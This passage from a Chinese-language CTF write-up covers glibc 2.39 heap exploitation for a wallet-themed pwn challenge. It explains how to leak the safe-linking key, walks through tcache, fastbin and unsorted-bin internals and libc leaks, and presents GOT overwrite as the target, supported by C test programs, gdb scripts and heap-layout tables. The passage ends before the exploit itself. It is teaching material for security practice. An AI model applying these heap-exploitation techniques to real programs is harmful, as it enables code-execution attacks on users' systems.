\texttt{tcache\_\allowbreak{}entry} 的第一個欄位就是 \texttt{next} ------所以
\texttt{e} 本身的位置就是 user data
開頭，\texttt{\&\allowbreak{}e-\allowbreak{}\textgreater{}\allowbreak{}next\ \allowbreak{}==\ \allowbreak{}e\ \allowbreak{}==\ \allowbreak{}user\ \allowbreak{}位址}。 （fastbin
也一樣：它的 \texttt{fd} 在 \texttt{malloc\_\allowbreak{}chunk} 的
\texttt{+0x10}，\texttt{\&\allowbreak{}p-\allowbreak{}\textgreater{}\allowbreak{}fd} 仍是「標頭 + 0x10」。）
\texttt{\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12}
則是「丟掉頁內位移、只留頁號」：ASLR 以 \textbf{4
KB（2¹²）頁}為單位隨機化， 高位本來就猜得到，glibc
就拿整數頁號當免費的金鑰。
\end{quote}

因為 \texttt{user\ \allowbreak{}位址\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12} 會把低 12
bits 全部丟掉，所以：

\begin{quote}
\textbf{要知道 \texttt{user\ \allowbreak{}位址\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12}
才能編碼，但不需要知道完整的 user 位址！}
\end{quote}

\texttt{(user\ \allowbreak{}位址\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12)}
怎麼拿？\textbf{當一個 chunk 被 free 到「空鏈」時}：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
   stored = (user 位址 >> 12) ^ NULL = (user 位址 >> 12)
\end{Verbatim}

所以 \textbf{UAF 讀出它的 \texttt{next} 欄位 = 直接拿到 (user 位址
\textgreater\textgreater{} 12)}，這就是我們的
\texttt{safe-\allowbreak{}linking\ \allowbreak{}key}。有了它就能算出要寫入的編碼值：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
   stored = safe ^ 目標位址
\end{Verbatim}

\begin{quote}
※實測 \textbf{實測：key 是 user 位址，不是 chunk 標頭（兩者差
0x10，跨頁時答案不同）} 做法：一直 \texttt{malloc(0x80)}，挑一塊
\textbf{user 位址剛好落在 4 KB 邊界}上的 chunk
（這樣它的標頭會在\textbf{上一頁}），free 到空鏈後讀
\texttt{next}。完整可編譯的程式（存成 \texttt{t.\allowbreak{}c}）：

\begin{Shaded}
\begin{Highlighting}[]
\PreprocessorTok{\#include \textasciigrave{}}\ImportTok{\textless{}stdio.h\textgreater{}}\PreprocessorTok{\textasciigrave{}}
\PreprocessorTok{\#include \textasciigrave{}}\ImportTok{\textless{}stdlib.h\textgreater{}}\PreprocessorTok{\textasciigrave{}}
\PreprocessorTok{\#include \textasciigrave{}}\ImportTok{\textless{}stdint.h\textgreater{}}\PreprocessorTok{\textasciigrave{}}
\PreprocessorTok{\#include \textasciigrave{}}\ImportTok{\textless{}string.h\textgreater{}}\PreprocessorTok{\textasciigrave{}}
\PreprocessorTok{\#define N }\DecValTok{400}
\DataTypeTok{static} \DataTypeTok{char} \OperatorTok{*}\NormalTok{p}\OperatorTok{[}\NormalTok{N}\OperatorTok{];}
\DataTypeTok{int}\NormalTok{ main}\OperatorTok{(}\DataTypeTok{void}\OperatorTok{)\{}
    \DataTypeTok{int}\NormalTok{ target }\OperatorTok{=} \OperatorTok{{-}}\DecValTok{1}\OperatorTok{;}
    \ControlFlowTok{for} \OperatorTok{(}\DataTypeTok{int}\NormalTok{ i }\OperatorTok{=} \DecValTok{0}\OperatorTok{;}\NormalTok{ i }\OperatorTok{\textless{}}\NormalTok{ N}\OperatorTok{;}\NormalTok{ i}\OperatorTok{++)} \OperatorTok{\{}
\NormalTok{        p}\OperatorTok{[}\NormalTok{i}\OperatorTok{]} \OperatorTok{=}\NormalTok{ malloc}\OperatorTok{(}\BaseNTok{0x80}\OperatorTok{);}
\NormalTok{        memset}\OperatorTok{(}\NormalTok{p}\OperatorTok{[}\NormalTok{i}\OperatorTok{],} \CharTok{\textquotesingle{}x\textquotesingle{}}\OperatorTok{,} \BaseNTok{0x80}\OperatorTok{);}
        \ControlFlowTok{if} \OperatorTok{((}\DataTypeTok{uint64\_t}\OperatorTok{)}\NormalTok{p}\OperatorTok{[}\NormalTok{i}\OperatorTok{]} \OperatorTok{\%} \BaseNTok{0x1000} \OperatorTok{==} \DecValTok{0} \OperatorTok{\&\&}\NormalTok{ target }\OperatorTok{\textless{}} \DecValTok{0}\OperatorTok{)}\NormalTok{ target }\OperatorTok{=}\NormalTok{ i}\OperatorTok{;}
    \OperatorTok{\}}
    \ControlFlowTok{if} \OperatorTok{(}\NormalTok{target }\OperatorTok{\textless{}} \DecValTok{0}\OperatorTok{)} \OperatorTok{\{}\NormalTok{ puts}\OperatorTok{(}\StringTok{"no page{-}boundary chunk"}\OperatorTok{);} \ControlFlowTok{return} \DecValTok{1}\OperatorTok{;} \OperatorTok{\}}
\NormalTok{    free}\OperatorTok{(}\NormalTok{p}\OperatorTok{[}\NormalTok{target}\OperatorTok{]);}                       \CommentTok{/* 丟進「空的」tcache 鏈 */}
    \DataTypeTok{uint64\_t}\NormalTok{ stored }\OperatorTok{=} \OperatorTok{*(}\DataTypeTok{uint64\_t} \OperatorTok{*)}\NormalTok{p}\OperatorTok{[}\NormalTok{target}\OperatorTok{];}
\NormalTok{    printf}\OperatorTok{(}\StringTok{"user   = }\SpecialCharTok{\%p}\StringTok{   header = }\SpecialCharTok{\%p\textbackslash{}n}\StringTok{"}\OperatorTok{,}\NormalTok{ p}\OperatorTok{[}\NormalTok{target}\OperatorTok{],}\NormalTok{ p}\OperatorTok{[}\NormalTok{target}\OperatorTok{]} \OperatorTok{{-}} \BaseNTok{0x10}\OperatorTok{);}
\NormalTok{    printf}\OperatorTok{(}\StringTok{"stored      = }\SpecialCharTok{\%\#018lx\textbackslash{}n}\StringTok{"}\OperatorTok{,}\NormalTok{ stored}\OperatorTok{);}
\NormalTok{    printf}\OperatorTok{(}\StringTok{"user   \textgreater{}\textgreater{}12 = }\SpecialCharTok{\%\#018lx}\StringTok{  }\SpecialCharTok{\%s\textbackslash{}n}\StringTok{"}\OperatorTok{,} \OperatorTok{(}\DataTypeTok{uint64\_t}\OperatorTok{)}\NormalTok{p}\OperatorTok{[}\NormalTok{target}\OperatorTok{]} \OperatorTok{\textgreater{}\textgreater{}} \DecValTok{12}\OperatorTok{,}
           \OperatorTok{((}\DataTypeTok{uint64\_t}\OperatorTok{)}\NormalTok{p}\OperatorTok{[}\NormalTok{target}\OperatorTok{]} \OperatorTok{\textgreater{}\textgreater{}} \DecValTok{12}\OperatorTok{)} \OperatorTok{==}\NormalTok{ stored }\OperatorTok{?} \StringTok{"MATCH"} \OperatorTok{:} \StringTok{"no"}\OperatorTok{);}
\NormalTok{    printf}\OperatorTok{(}\StringTok{"header \textgreater{}\textgreater{}12 = }\SpecialCharTok{\%\#018lx}\StringTok{  }\SpecialCharTok{\%s\textbackslash{}n}\StringTok{"}\OperatorTok{,} \OperatorTok{((}\DataTypeTok{uint64\_t}\OperatorTok{)}\NormalTok{p}\OperatorTok{[}\NormalTok{target}\OperatorTok{]} \OperatorTok{{-}} \BaseNTok{0x10}\OperatorTok{)} \OperatorTok{\textgreater{}\textgreater{}} \DecValTok{12}\OperatorTok{,}
           \OperatorTok{(((}\DataTypeTok{uint64\_t}\OperatorTok{)}\NormalTok{p}\OperatorTok{[}\NormalTok{target}\OperatorTok{]} \OperatorTok{{-}} \BaseNTok{0x10}\OperatorTok{)} \OperatorTok{\textgreater{}\textgreater{}} \DecValTok{12}\OperatorTok{)} \OperatorTok{==}\NormalTok{ stored }\OperatorTok{?} \StringTok{"MATCH"} \OperatorTok{:} \StringTok{"NO"}\OperatorTok{);}
    \ControlFlowTok{return} \DecValTok{0}\OperatorTok{;}
\OperatorTok{\}}
\end{Highlighting}
\end{Shaded}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ gcc {-}O0 t.c {-}o t \&\& ./t                                  \# 系統 glibc 2.44}
\NormalTok{user   = 0x55db27917000   header = 0x55db27916ff0}
\NormalTok{stored      = 0x000000055db27917}
\NormalTok{user   \textgreater{}\textgreater{}12 = 0x000000055db27917  MATCH}
\NormalTok{header \textgreater{}\textgreater{}12 = 0x000000055db27916  NO}

\NormalTok{$ ./ld{-}linux{-}x86{-}64.so.2 {-}{-}library{-}path . t               \# 題目附的 glibc 2.39}
\NormalTok{user   = 0x55558c8b9000   header = 0x55558c8b8ff0}
\NormalTok{stored      = 0x000000055558c8b9}
\NormalTok{user   \textgreater{}\textgreater{}12 = 0x000000055558c8b9  MATCH}
\NormalTok{header \textgreater{}\textgreater{}12 = 0x000000055558c8b8  NO}
\end{Highlighting}
\end{Shaded}

⇒ \textbf{兩個版本都一樣：key ＝
\texttt{user\ \allowbreak{}位址\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12} ＝
\texttt{\&\allowbreak{}e-\allowbreak{}\textgreater{}\allowbreak{}next\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12}。}
（上面位址是某一次的執行結果，ASLR 每次不同；\textbf{重點是
\texttt{user\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}12} 永遠 MATCH、
\texttt{header\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}12} 永遠 NO}。）
不跨頁時兩者\textbf{剛好相同}（這就是為什麼照「標頭
\textgreater\textgreater{} 12」算大多時候也能過 ------
但那是運氣，等到某塊 chunk
剛好卡在頁邊界就會對不上，而且完全看不出原因）。
\end{quote}

\textbf{兩個地方要分清楚（本題的核心）：}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
   tcache_perthread_struct.entries[7]        被 free 的 chunk 內部
   （在 heap 最開頭，明文！）                 （next / key，next 是編碼值！）
   ┌──────────────────┐                    ┌───────────────────────────┐
   │ 0x406970         │ ─────────────────► │ next = safe ^ 下一個位址  │  ← 編碼過
   └──────────────────┘                    │ key  = tcache_key         │  ← 隨機值
      ↑ 直接就是 malloc 的回傳位址            └────────────────────────┘
        （user 位址 = chunk 標頭 + 0x10）         ↑ 只有這格要 ^ (user 位址 >> 12)
\end{Verbatim}

\begin{quote}
※提示 換句話說：\textbf{safe-linking 讓「chunk 內的 next」需要
\texttt{user\ \allowbreak{}位址\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}12} 才能改， 但 glibc
把「同一個位址的明文」放在 \texttt{entries{[}{]}}
裡}。我們只要有辦法洩漏 「一次 free 到空鏈」的
\texttt{next}（=\texttt{user\ \allowbreak{}位址\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}12}），就足以偽造
\texttt{fd}。 這也是 §8.2 那句「這裡不需要知道 chunk
的完整位址」的原理。
\end{quote}

\textbf{這也是這題 flag
名稱的由來}：\texttt{s4fe\_\allowbreak{}l1nk1ng\_\allowbreak{}w0nt\_\allowbreak{}s4ve\_\allowbreak{}y0ur\_\allowbreak{}tc4che}
（safe-linking 救不了你的 tcache）------因為程式自己把「編碼用的
key」洩漏給你了。

\paragraph{5.5 其他 bin（了解就好，本題只用到 unsorted
bin）}\label{ux5176ux4ed6-binux4e86ux89e3ux5c31ux597dux672cux984cux53eaux7528ux5230-unsorted-bin}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
 fastbin：大小 <= 0x80（global_max_fast）的 chunk，tcache 滿了之後的下一站。
          LIFO 單向鏈，**沒有數量上限**（「只能放 7 個」是 tcache 的規矩，別搞混；
          實測 glibc 2.39 連丟 13 塊進 fastbin 也不會被拒，見下方實測）。
          注意：fastbin 的 next 存的是「chunk 標頭位址」（不是 malloc 回傳值），
          tcache 的 next 存的才是 malloc 回傳值。
 small bin：0x90 ~ 0x3f0（< 0x400），雙向鏈結（fd/bk）。
 large bin：>= 0x400，還會排序（0x400 已經是**第一條 large bin**，不是 small bin）。
 unsorted bin：✶ 任何「不進 fastbin、tcache 又滿了」的 chunk 都會先丟這裡。
               它的 fd/bk 指向 main_arena 裡的鏈頭 → ✶✶ 這是 libc 洩漏的經典來源！
 top chunk：heap 尾端還沒被切出去的區域，不夠用時會 brk/mmap 擴張。
\end{Verbatim}

\textbf{實測：fastbin 沒有「7 個」的上限}（用題目附的 2.39 libc 跑）：

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{/* /tmp/fbt.c */}
\PreprocessorTok{\#include }\ImportTok{\textless{}stdio.h\textgreater{}}
\PreprocessorTok{\#include }\ImportTok{\textless{}stdlib.h\textgreater{}}
\PreprocessorTok{\#include }\ImportTok{\textless{}string.h\textgreater{}}
\PreprocessorTok{\#include }\ImportTok{\textless{}gnu/libc{-}version.h\textgreater{}}
\PreprocessorTok{\#define N }\DecValTok{20}
\DataTypeTok{int}\NormalTok{ main}\OperatorTok{(}\DataTypeTok{void}\OperatorTok{)\{}
\NormalTok{    fprintf}\OperatorTok{(}\NormalTok{stderr}\OperatorTok{,}\StringTok{"glibc }\SpecialCharTok{\%s\textbackslash{}n}\StringTok{"}\OperatorTok{,}\NormalTok{ gnu\_get\_libc\_version}\OperatorTok{());}
    \DataTypeTok{void} \OperatorTok{*}\NormalTok{p}\OperatorTok{[}\NormalTok{N}\OperatorTok{];}
    \ControlFlowTok{for}\OperatorTok{(}\DataTypeTok{int}\NormalTok{ i}\OperatorTok{=}\DecValTok{0}\OperatorTok{;}\NormalTok{i}\OperatorTok{\textless{}}\NormalTok{N}\OperatorTok{;}\NormalTok{i}\OperatorTok{++)\{}\NormalTok{ p}\OperatorTok{[}\NormalTok{i}\OperatorTok{]=}\NormalTok{malloc}\OperatorTok{(}\BaseNTok{0x18}\OperatorTok{);}\NormalTok{ memset}\OperatorTok{(}\NormalTok{p}\OperatorTok{[}\NormalTok{i}\OperatorTok{],}\BaseNTok{0x41}\OperatorTok{,}\BaseNTok{0x18}\OperatorTok{);} \OperatorTok{\}}
    \ControlFlowTok{for}\OperatorTok{(}\DataTypeTok{int}\NormalTok{ i}\OperatorTok{=}\DecValTok{0}\OperatorTok{;}\NormalTok{i}\OperatorTok{\textless{}}\NormalTok{N}\OperatorTok{;}\NormalTok{i}\OperatorTok{++)}\NormalTok{ free}\OperatorTok{(}\NormalTok{p}\OperatorTok{[}\NormalTok{i}\OperatorTok{]);}   \CommentTok{/* 前 7 個進 tcache，其餘進 fastbin */}
    \DataTypeTok{unsigned} \DataTypeTok{long}\NormalTok{ cur}\OperatorTok{=(}\DataTypeTok{unsigned} \DataTypeTok{long}\OperatorTok{)}\NormalTok{p}\OperatorTok{[}\NormalTok{N}\OperatorTok{{-}}\DecValTok{1}\OperatorTok{],}\NormalTok{ count}\OperatorTok{=}\DecValTok{1}\OperatorTok{,}\NormalTok{ ch}\OperatorTok{;}
    \ControlFlowTok{while}\OperatorTok{(}\DecValTok{1}\OperatorTok{)\{}\NormalTok{ ch }\OperatorTok{=} \OperatorTok{*(}\DataTypeTok{unsigned} \DataTypeTok{long}\OperatorTok{*)}\NormalTok{cur }\OperatorTok{\^{}} \OperatorTok{(}\NormalTok{cur}\OperatorTok{\textgreater{}\textgreater{}}\DecValTok{12}\OperatorTok{);}   \CommentTok{/* fastbin fd 也是 safe{-}linking 編碼 */}
              \ControlFlowTok{if}\OperatorTok{(!}\NormalTok{ch}\OperatorTok{)} \ControlFlowTok{break}\OperatorTok{;}\NormalTok{ cur }\OperatorTok{=}\NormalTok{ ch }\OperatorTok{+} \BaseNTok{0x10}\OperatorTok{;}\NormalTok{ count}\OperatorTok{++;} \ControlFlowTok{if}\OperatorTok{(}\NormalTok{count}\OperatorTok{\textgreater{}}\DecValTok{64}\OperatorTok{)} \ControlFlowTok{break}\OperatorTok{;} \OperatorTok{\}}
\NormalTok{    fprintf}\OperatorTok{(}\NormalTok{stderr}\OperatorTok{,}\StringTok{"freed }\SpecialCharTok{\%d}\StringTok{ chunks of tcache{-}size 0x20: fastbin length=}\SpecialCharTok{\%lu\textbackslash{}n}\StringTok{"}\OperatorTok{,}\NormalTok{ N}\OperatorTok{,}\NormalTok{ count}\OperatorTok{);}
    \ControlFlowTok{return} \DecValTok{0}\OperatorTok{;}
\OperatorTok{\}}
\end{Highlighting}
\end{Shaded}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{$}\NormalTok{ gcc }\AttributeTok{{-}O0} \AttributeTok{{-}o}\NormalTok{ /tmp/fbt /tmp/fbt.c}
\ExtensionTok{$}\NormalTok{ cd pwn4 }\KeywordTok{\&\&} \ExtensionTok{./ld{-}linux{-}x86{-}64.so.2} \AttributeTok{{-}{-}library{-}path}\NormalTok{ . /tmp/fbt}
\ExtensionTok{glibc}\NormalTok{ 2.39}
\ExtensionTok{freed}\NormalTok{ 20 chunks of tcache{-}size 0x20: fastbin length=13    ← ✶ 13 }\OperatorTok{\textgreater{}}\NormalTok{ 7，沒有上限}
\end{Highlighting}
\end{Shaded}

真正會清掉 fastbin 的是 \texttt{malloc\_\allowbreak{}consolidate()}（合併進 unsorted
bin）， 而它只在「有大請求 / 需要合併」時才會被觸發。

\textbf{unsorted bin 的形狀（空的時候）：}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
   main_arena.bins[0]（在 libc 裡，位址 = libc_base + 0x203ac0 + 0x60）
        ┌─────────────────────────┐
        │ fd ──┐                  │
        │ bk ◄─┘   (指向自己)     │
        └─────────────────────────┘

   把 victim 丟進空的 unsorted bin 後：
   victim->fd = victim->bk = &main_arena.bins[0]   ← ✶✶ 兩個都變成 libc 位址！
\end{Verbatim}

所以只要 UAF 讀這個 chunk 的前 16 bytes，就得到
\texttt{libc\_\allowbreak{}base\ \allowbreak{}+\ \allowbreak{}0x203b20}。

\paragraph{\texorpdfstring{5.6 \texttt{\_\allowbreak{}\_\allowbreak{}free\_\allowbreak{}hook} /
\texttt{\_\allowbreak{}\_\allowbreak{}malloc\_\allowbreak{}hook}
已經被移除}{5.6 \_\_free\_hook / \_\_malloc\_hook 已經被移除}}\label{free_hook-__malloc_hook-ux5df2ux7d93ux88abux79fbux9664}

\begin{itemize}
\tightlist
\item
  glibc 2.34
  起，\texttt{\_\allowbreak{}\_\allowbreak{}free\_\allowbreak{}hook}、\texttt{\_\allowbreak{}\_\allowbreak{}malloc\_\allowbreak{}hook}、\texttt{\_\allowbreak{}\_\allowbreak{}realloc\_\allowbreak{}hook}
  \textbf{被刪掉了}。
\item
  所以「把 \texttt{\_\allowbreak{}\_\allowbreak{}free\_\allowbreak{}hook} 改成 system，再
  free(``/bin/sh'')」這種 2.31 時代的老招
  \textbf{在本題（2.39）完全不能用}。
\item
  現代的替代目標：

  \begin{enumerate}
  \def\labelenumi{\arabic{enumi}.}
  \tightlist
  \item
    \textbf{GOT}（本題 Partial RELRO → \texttt{got.\allowbreak{}plt} 可寫）★最簡單
  \item
    \texttt{\_\allowbreak{}IO\_\allowbreak{}2\_\allowbreak{}1\_\allowbreak{}stdout\_\allowbreak{}} 的 vtable / FSOP
  \item
    \texttt{\_\allowbreak{}\_\allowbreak{}exit\_\allowbreak{}funcs}、\texttt{\_\allowbreak{}rtld\_\allowbreak{}global.\allowbreak{}\_\allowbreak{}dl\_\allowbreak{}rtld\_\allowbreak{}lock\_\allowbreak{}recursive}（需要
    libc base）
  \item
    回到 stack 的返回位址（需要 stack leak）
  \end{enumerate}
\end{itemize}

本題因為 \textbf{non-PIE + Partial RELRO}，選 (1) 最乾淨。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{6. 本題 heap 佈局（gdb
實測）}\label{ux672cux984c-heap-ux4f48ux5c40gdb-ux5be6ux6e2c}

實驗：開 9 個 wallet（S、D、W0\textasciitilde W6，size 都是 0x80），關掉
W0\textasciitilde W6（塞滿 tcache）， 然後
\texttt{Transfer(0\ \allowbreak{}-\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}1)}，在 \texttt{0x401b21}（transfer
剛做完）下中斷點。

\textbf{怎麼重現這張表（可直接照抄）：}

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{cd}\NormalTok{ /home/kzzz/Documents/code/ctf/sunshine/pwn4}
\CommentTok{\# 1) 準備輸入檔：S/D 各 0x80 → 再開 W0\textasciitilde{}W6 → 關掉 slot 2..8（塞滿 tcache）→ Transfer(0{-}\textgreater{}1)}
\BuiltInTok{printf} \StringTok{\textquotesingle{}1\textbackslash{}nS\textbackslash{}n128\textbackslash{}n1\textbackslash{}nD\textbackslash{}n128\textbackslash{}n\textquotesingle{}} \OperatorTok{\textgreater{}}\NormalTok{ /tmp/in.bin}
\ControlFlowTok{for}\NormalTok{ i }\KeywordTok{in}\NormalTok{ 0 1 2 3 4 5 6}\KeywordTok{;} \ControlFlowTok{do} \BuiltInTok{printf} \StringTok{"1\textbackslash{}nW}\VariableTok{$i}\StringTok{\textbackslash{}n128\textbackslash{}n"} \OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ /tmp/in.bin}\KeywordTok{;} \ControlFlowTok{done}
\ControlFlowTok{for}\NormalTok{ i }\KeywordTok{in}\NormalTok{ 2 3 4 5 6 7 8}\KeywordTok{;} \ControlFlowTok{do} \BuiltInTok{printf} \StringTok{"5\textbackslash{}n}\VariableTok{$i}\StringTok{\textbackslash{}n"}     \OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ /tmp/in.bin}\KeywordTok{;} \ControlFlowTok{done}
\BuiltInTok{printf} \StringTok{\textquotesingle{}4\textbackslash{}n0\textbackslash{}n1\textbackslash{}n\textquotesingle{}} \OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ /tmp/in.bin}

\CommentTok{\# 2) 用題目附的 2.39 跑：cm\_dbg 的 interpreter 已經 patchelf 指向本地 loader}
\FunctionTok{gdb} \AttributeTok{{-}q} \AttributeTok{{-}batch} \AttributeTok{{-}ex} \StringTok{\textquotesingle{}b *0x401b21\textquotesingle{}} \AttributeTok{{-}ex} \StringTok{\textquotesingle{}run \textless{} /tmp/in.bin\textquotesingle{}}\NormalTok{ ./cm\_dbg }\DataTypeTok{\textbackslash{}}
    \AttributeTok{{-}ex} \StringTok{\textquotesingle{}x/2gx 0x405000\textquotesingle{}}  \AttributeTok{{-}ex} \StringTok{\textquotesingle{}x/16hx 0x405010\textquotesingle{}} \AttributeTok{{-}ex} \StringTok{\textquotesingle{}x/16gx 0x405090\textquotesingle{}} \DataTypeTok{\textbackslash{}}
    \AttributeTok{{-}ex} \StringTok{\textquotesingle{}x/6gx 0x4062e0\textquotesingle{}}  \AttributeTok{{-}ex} \StringTok{\textquotesingle{}x/2gx 0x406370\textquotesingle{}}
\end{Highlighting}
\end{Shaded}

\begin{quote}
\texttt{0x401b21} 是 \texttt{Transfer} 裡「印 Transfer
complete」的那一行 → 所有賦值都已經做完。 若 \texttt{cm\_\allowbreak{}dbg} 不見了：
\texttt{cp\ \allowbreak{}cache\_\allowbreak{}money\ \allowbreak{}cm\_\allowbreak{}dbg\ \allowbreak{}\&\allowbreak{}\&\allowbreak{}\ \allowbreak{}patchelf\ \allowbreak{}-\allowbreak{}\/\allowbreak{}-\allowbreak{}set-\allowbreak{}interpreter\ \allowbreak{}"\$\allowbreak{}PWD/\allowbreak{}ld-\allowbreak{}linux-\allowbreak{}x86-\allowbreak{}64.\allowbreak{}so.\allowbreak{}2"\ \allowbreak{}cm\_\allowbreak{}dbg}。
\end{quote}

\textbf{實測輸出（節錄）：}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
FREED_LEDGER = 0x4062f0   SRC(rbx) = 0x4062b0   DST(rbp) = 0x406380
HEAP = 0x405000   LIBC_BASE = 0x7ffff7c00000   main_arena = 0x7ffff7e03ac0

(gdb) x/2gx 0x405000
0x405000: 0x0000000000000000  0x0000000000000291   ← tcache_perthread_struct size 0x291 ✓
(gdb) x/16hx 0x405010
0x405010: 0x0000 0x0000 0x0007 ...（idx7）... 0x0007  ← counts[2]=7、counts[7]=7 ✓
(gdb) x/16gx 0x405090
0x4050a0: 0x406930            0x4050c8: 0x406970   ← entries 存「user 位址」✓（見 §5.3）
\end{Verbatim}

底下是完整的 gdb 輸出：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
(gdb) info proc mappings
0x0000000000405000 0x0000000000426000 0x21000  rw-p  [heap]      ← heap 起點 = 0x405000

(gdb) x/16hx 0x405010        ← tcache_perthread_struct.counts[]
0x405010: 0x0000 0x0000 0x0007 0x0000 0x0000 0x0000 0x0000 0x0007
                   ↑idx1  ↑idx2=7（0x40 的 chunk，7 個 wallet 結構）
                                                    ↑idx7=7（0x90 的 chunk，7 個 ledger）
(gdb) x/16gx 0x405090        ← entries[]
0x4050a0: 0x406930            ← entries[2]
0x4050c8: 0x406970            ← entries[7]
\end{Verbatim}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
位址
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
chunk 大小
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
內容
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
備註
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{0x405000} & \texttt{0x291} & \texttt{tcache\_\allowbreak{}perthread\_\allowbreak{}struct}
& heap 第一塊，user data 在 \texttt{0x405010} \\
\texttt{0x405290} & \texttt{0x1011} & \textbf{stdin 的 stdio 緩衝區} &
glibc 第一次 \texttt{fgets} 時自動配置的 0x1000 buffer \\
\texttt{0x4062a0} & \texttt{0x41} & \textbf{S} 的 wallet 結構 &
\texttt{slots{[}0{]}\ \allowbreak{}=\ \allowbreak{}0x4062b0} \\
\texttt{0x4062e0} & \texttt{0x91} & \textbf{S} 的 ledger（size 0x80） &
transfer 後被 free → 進 unsorted bin \\
\texttt{0x406370} & \texttt{0x40} & \textbf{D} 的 wallet 結構 &
\texttt{slots{[}1{]}\ \allowbreak{}=\ \allowbreak{}0x406380}（注意 size 的 P bit 被清掉） \\
\texttt{0x4063b0} & \texttt{0x91} & \textbf{D} 的 ledger & \\
\texttt{0x406440} & \texttt{0x41} & W0 結構 & \\
\texttt{0x406480} & \texttt{0x91} & W0 ledger & 被 Close → 進
tcache{[}0x90{]} \\
\texttt{0x406510} & \texttt{0x41} & W1 結構 & \\
\texttt{0x406550} & \texttt{0x91} & W1 ledger & 進 tcache \\
\texttt{0x4065e0} & \texttt{0x41} & W2 結構 & \\
\texttt{0x406620} & \texttt{0x91} & W2 ledger & \\
\texttt{0x4066b0} & \texttt{0x41} & W3 結構 & \\
\texttt{0x4066f0} & \texttt{0x91} & W3 ledger & \\
\texttt{0x406780} & \texttt{0x41} & W4 結構 & \\
\texttt{0x4067c0} & \texttt{0x91} & W4 ledger & \\
\texttt{0x406850} & \texttt{0x41} & W5 結構 & \\
\texttt{0x406890} & \texttt{0x91} & W5 ledger & \\
\texttt{0x406920} & \texttt{0x41} & W6 結構 & \\
\texttt{0x406960} & \texttt{0x91} & W6 ledger & \\
\texttt{0x4069f0} & \texttt{0x1f611} & \textbf{top chunk} & 剩下的
heap \\
\end{longtable}
}

\textbf{被釋放的 S ledger（0x4062e0）：}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
(gdb) x/6gx 0x4062e0
0x4062e0: 0x0000000000000000  0x0000000000000091   ← prev_size / size=0x91
0x4062f0: 0x00007ffff7e03b20  0x00007ffff7e03b20   ← fd = bk = &main_arena.bins[0]
0x406300: 0x0000000000000000  0x0000000000000000
\end{Verbatim}

當時 libc 被載入到 \texttt{0x7ffff7c00000}，所以

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
0x7ffff7e03b20 - 0x7ffff7c00000 = 0x203b20   ← ✶ 這就是 OFF_UNSORTED
\end{Verbatim}

也就是 \texttt{main\_\allowbreak{}arena} 在 libc \texttt{+0x203ac0}，而它裡面的
\texttt{bins{[}0{]}}（unsorted bin 鏈頭）在 \texttt{+0x60}。

其他重要固定位址（non-PIE）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
slot 表           0x4040c0  （slots[0]）
GOT 起點          0x404000
strtol@got        0x404040
假的 wallet       0x4040a8  （見 §8 phase 3）
程式 .text        0x401000 ~ 0x401d60
\end{Verbatim}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{7.
漏洞的觸發條件與利用思路}\label{ux6f0fux6d1eux7684ux89f8ux767cux689dux4ef6ux8207ux5229ux7528ux601dux8def}

\paragraph{7.1 觸發條件}\label{ux89f8ux767cux689dux4ef6}

